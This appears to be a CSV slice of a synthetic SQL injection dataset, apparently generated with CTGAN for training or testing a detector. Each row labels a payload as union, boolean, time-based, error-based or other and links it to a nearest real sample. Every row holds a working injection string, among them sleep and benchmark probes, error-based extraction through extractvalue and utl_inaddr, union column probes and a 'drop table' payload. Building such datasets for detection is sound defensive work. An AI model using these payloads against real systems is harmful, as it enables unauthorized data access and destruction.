id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000137,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,3.5909616716961246
CTGAN_000138,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  --",nearest_attack_euclidean,R001370,3.557579974309809
CTGAN_000139,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R007873,3.4671182895150303
CTGAN_000140,attack,boolean,1   )    )     )   and 9198  =  9198--,nearest_attack_euclidean,R004741,6.0003173394517235
CTGAN_000141,attack,time,1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R004559,4.36025097270745
CTGAN_000142,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R008151,3.3773832820460057
CTGAN_000143,attack,other,1' where 8584  =  8584 order by 1#,nearest_attack_euclidean,R008437,3.759362207812775
CTGAN_000144,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",nearest_attack_euclidean,R001572,4.0350519338553035
CTGAN_000145,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,1.038983415153947
CTGAN_000146,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R005102,2.336317823758564
CTGAN_000147,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000982,3.3863841506472245
CTGAN_000148,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.4413178435142955
CTGAN_000149,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,3.1599829822935632
CTGAN_000150,attack,other,1'  )   where 1115  =  1115,nearest_attack_euclidean,R006621,3.3003142879017444
CTGAN_000151,attack,boolean,"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R008240,3.7404376394390617
CTGAN_000152,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R002682,2.9062582990876398
CTGAN_000153,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R006203,3.9802859234490513
CTGAN_000154,attack,other, (  case when 8422  =  8452 then 1 else null end  ) ,nearest_attack_euclidean,R006965,4.480480265727329
CTGAN_000155,attack,other,"make_set  (  6174  =  9734,1  )  ",nearest_attack_euclidean,R005136,2.7093895104119503
CTGAN_000156,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,2.487592454101016
CTGAN_000157,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",nearest_attack_euclidean,R007411,4.872288667681997
CTGAN_000158,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl",nearest_attack_euclidean,R001312,3.4837898311218516
CTGAN_000159,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003358,4.316462175808208
CTGAN_000160,attack,other," , drop table temp --",nearest_attack_euclidean,R000360,2.3132939598697453
CTGAN_000161,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000625,4.350490388953898
CTGAN_000162,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,24.254677878782807
CTGAN_000163,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,4.5601637201208165
CTGAN_000164,attack,error,"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R004011,28.68887798814126
CTGAN_000165,attack,boolean,"1 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R007518,2.3928024987141447
CTGAN_000166,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R003368,8.730862733590858
CTGAN_000167,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006418,3.0355587747596275
CTGAN_000168,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,8.309414189710422
CTGAN_000169,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000803,5.4604607448156885
CTGAN_000170,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",nearest_attack_euclidean,R001899,5.3883766620705345
CTGAN_000171,attack,error,1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,nearest_attack_euclidean,R004081,3.5713343265944975
CTGAN_000172,attack,other,"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R008214,10.006613035657425
CTGAN_000173,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,1.0511500616042064
CTGAN_000174,attack,boolean,"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001603,3.9843257962709027
CTGAN_000175,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,4.195266259950114
CTGAN_000176,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000261,7.864952327961586
CTGAN_000177,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",nearest_attack_euclidean,R004311,3.0655775324461376
CTGAN_000178,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,7.446139373566032
CTGAN_000179,attack,other, (  case when 6398  =  6398 then 1 else null end  ) ,nearest_attack_euclidean,R002089,2.3362998408437137
CTGAN_000180,attack,boolean,-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R003424,3.459497513133061
CTGAN_000181,attack,other,"1""  )   as hsws where 6656  =  6656",nearest_attack_euclidean,R004999,2.2060719446957098
CTGAN_000182,attack,boolean,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007862,3.7632401574191916
CTGAN_000183,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",nearest_attack_euclidean,R005565,3.220538585726178
CTGAN_000184,attack,boolean,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003116,1.9677279411575548
CTGAN_000185,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.7959276450510475
CTGAN_000186,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R008260,2.5417413277492527
CTGAN_000187,attack,error,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",nearest_attack_euclidean,R008371,3.16210459307339
CTGAN_000188,attack,error,"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",nearest_attack_euclidean,R004617,6.268153210846312
CTGAN_000189,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,3.1376220880942727
CTGAN_000190,attack,error,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",nearest_attack_euclidean,R006264,3.830946201460026
CTGAN_000191,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,3.336764002462024
CTGAN_000192,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,1.9146571930635092
CTGAN_000193,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.4141739278618313
CTGAN_000194,attack,boolean,1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,nearest_attack_euclidean,R007207,3.1661894190435187
CTGAN_000195,attack,other,1'+  (  select zpdf where 2938  =  2938,nearest_attack_euclidean,R002869,1.924895779737783
CTGAN_000196,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R007287,1.638523074580307
CTGAN_000197,attack,boolean,"1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R007683,3.9101904765511373
CTGAN_000198,attack,other,select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,nearest_attack_euclidean,R006901,4.252070160850241
CTGAN_000199,attack,error,"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R005916,5.830999054508319
CTGAN_000200,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000868,2.907042822546781
CTGAN_000201,attack,error,"-7083"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ajcl"" like ""ajcl",nearest_attack_euclidean,R001351,4.722175787251578
CTGAN_000202,attack,boolean,-3088' or 6872  =  6872 and 'miwk'  =  'miwk,nearest_attack_euclidean,R001172,2.700899661897533
CTGAN_000203,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R005781,3.5044981584117925
CTGAN_000204,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R008656,3.15001145097295
CTGAN_000205,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R004432,3.3840310632239565
CTGAN_000206,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,3.084392566368164
CTGAN_000207,attack,time,1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',nearest_attack_euclidean,R007401,6.446972760363303
CTGAN_000208,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",nearest_attack_euclidean,R002314,3.4434493162086697
CTGAN_000209,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R007095,3.927371761189383
CTGAN_000210,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R006548,5.472530086550911
CTGAN_000211,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000455,5.9712093255296494
CTGAN_000212,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R004324,2.5465505328629385
CTGAN_000213,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R005578,4.012215221201608
CTGAN_000214,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,6.455772557235447
CTGAN_000215,attack,error,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008298,4.176512361791039
CTGAN_000216,attack,error,"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R002313,4.612725221884469
